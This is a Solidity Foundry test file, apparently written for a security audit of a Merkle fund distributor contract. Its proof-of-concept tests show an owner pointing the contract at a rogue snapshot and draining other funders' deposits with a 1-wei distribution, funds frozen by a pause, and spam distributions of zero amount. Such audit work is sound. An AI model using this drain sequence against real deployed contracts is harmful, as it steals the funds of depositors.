// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract OB_Snapshot is IMerkleSnapshot {
    MerkleState internal _s;

    function set(bytes32 root, uint256 totalValue) external {
        _s = MerkleState({
            blockNumber: block.number,
            timestamp: block.timestamp,
            root: root,
            ipfsHash: bytes32(uint256(1)),
            ipfsHashCid: "cid",
            totalValue: totalValue
        });
    }

    function getLatestState() external view returns (MerkleState memory) {
        return _s;
    }
}

contract OB_Token is ERC20 {
    constructor() ERC20("t", "t") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract OmegaPassB_Distributor is Test {
    OB_Snapshot internal honest;
    OB_Snapshot internal rogue;
    OB_Token internal token;
    MerkleFundDistributor internal dist;

    address internal owner = address(0xA0);
    address internal funderA = address(0xF1);
    address internal funderB = address(0xF2);
    address internal attacker = address(0xBAD);

    // one-leaf tree: leaf = keccak(bytes.concat(keccak(abi.encode(account,value)))) is the ROOT
    function _oneLeafRoot(address account, uint256 value) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(account, value))));
    }

    function setUp() public {
        honest = new OB_Snapshot();
        rogue = new OB_Snapshot();
        token = new OB_Token();
        dist = new MerkleFundDistributor(owner, address(honest), owner, 0, false);

        token.mint(funderA, 1_000_000e18);
        token.mint(funderB, 1_000_000e18);
        token.mint(attacker, 1e18);
    }

    /// FINDING: `claim` computes `claimedAmount = totalDistributable * value / totalMerkleValue`
    /// with NO cap against `amountFunded - feeAmount - amountDistributed`. All distributions of a
    /// token share one balance, so a distribution whose `totalMerkleValue` is smaller than the sum
    /// of its tree's leaf values drains every sibling distribution. The distributor OWNER can
    /// manufacture exactly that state with `setMerkleSnapshot`, which takes an arbitrary address.
    function test_OwnerDrainsOtherFundersViaSetMerkleSnapshot() public {
        // Two honest, independent funders each open a real distribution against a real
        // one-leaf tree (funderA is the sole claimant, value == totalValue).
        honest.set(_oneLeafRoot(funderA, 1_000e18), 1_000e18);
        vm.startPrank(funderA);
        token.approve(address(dist), type(uint256).max);
        dist.distribute(address(token), 500_000e18, bytes32(0));
        vm.stopPrank();

        vm.startPrank(funderB);
        token.approve(address(dist), type(uint256).max);
        dist.distribute(address(token), 400_000e18, bytes32(0));
        vm.stopPrank();

        uint256 held = token.balanceOf(address(dist));
        assertEq(held, 900_000e18, "both funders' money sits in one balance");

        // --- the attack -------------------------------------------------------------------
        // 1. owner points the distributor at a snapshot it controls: root = a one-leaf tree
        //    paying `attacker` a huge value, totalValue = 1.
        bytes32 rogueRoot = _oneLeafRoot(attacker, 900_000e18);
        rogue.set(rogueRoot, 1);
        vm.prank(owner);
        dist.setMerkleSnapshot(address(rogue));

        // 2. owner opens a 1 wei distribution against it (anyone may fund: allowlist disabled).
        vm.startPrank(attacker);
        token.approve(address(dist), type(uint256).max);
        uint256 idx = dist.distribute(address(token), 1, bytes32(0));
        vm.stopPrank();

        // 3. claim: claimedAmount = (1 - 0) * 1_000_000e18 / 1 = 1_000_000e18, capped only by the
        //    contract's real balance. Nothing checks it against this distribution's own funding.
        bytes32[] memory proof = new bytes32[](0);
        uint256 before = token.balanceOf(attacker);
        dist.claim(idx, attacker, 900_000e18, proof);
        uint256 gained = token.balanceOf(attacker) - before;

        console2.log("attacker funded (wei):", uint256(1));
        console2.log("attacker received   :", gained);
        assertEq(gained, 900_000e18, "drained BOTH funders' distributions");
        assertEq(token.balanceOf(address(dist)), 1, "distributor emptied to dust");

        // 4. the two honest distributions are now permanently unclaimable: the merkle proof is
        //    valid, the entitlement is real, and the transfer reverts on an empty balance.
        vm.expectRevert();
        dist.claim(0, funderA, 1_000e18, proof);
        vm.expectRevert();
        dist.claim(1, funderA, 1_000e18, proof);
    }

    /// FINDING: `claim` and `sweep` are BOTH `whenNotPaused`, and there is no other exit. An owner
    /// that pauses (or is compromised) freezes every claimant's funds and the funder's sweep with
    /// no recovery path that does not require the owner to act.
    function test_PauseTrapsEveryExitPath() public {
        honest.set(_oneLeafRoot(funderA, 1_000e18), 1_000e18);
        vm.startPrank(funderA);
        token.approve(address(dist), type(uint256).max);
        uint256 idx = dist.distribute(address(token), 1_000e18, bytes32(0), uint64(block.timestamp + 1 days));
        vm.stopPrank();

        vm.prank(owner);
        dist.pause();

        bytes32[] memory proof = new bytes32[](0);
        vm.expectRevert(); // EnforcedPause
        dist.claim(idx, funderA, 1_000e18, proof);

        vm.warp(block.timestamp + 2 days);
        vm.expectRevert(); // EnforcedPause — sweep is gated too
        dist.sweep(idx);

        assertEq(token.balanceOf(address(dist)), 1_000e18, "funds are stuck behind the pause");
    }

    /// LEAD-supporting: `distribute` with amount 0 is accepted and pushes an unbounded row that
    /// nobody can ever claim or sweep, at attacker-chosen cost.
    function test_ZeroAmountDistributionsAreAccepted() public {
        honest.set(_oneLeafRoot(funderA, 1_000e18), 1_000e18);
        vm.startPrank(attacker);
        token.approve(address(dist), type(uint256).max);
        uint256 i0 = dist.distribute(address(token), 0, bytes32(0));
        vm.stopPrank();
        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(i0);
        assertEq(d.amountFunded, 0);
        assertEq(dist.getDistributionCount(), 1);
    }
}
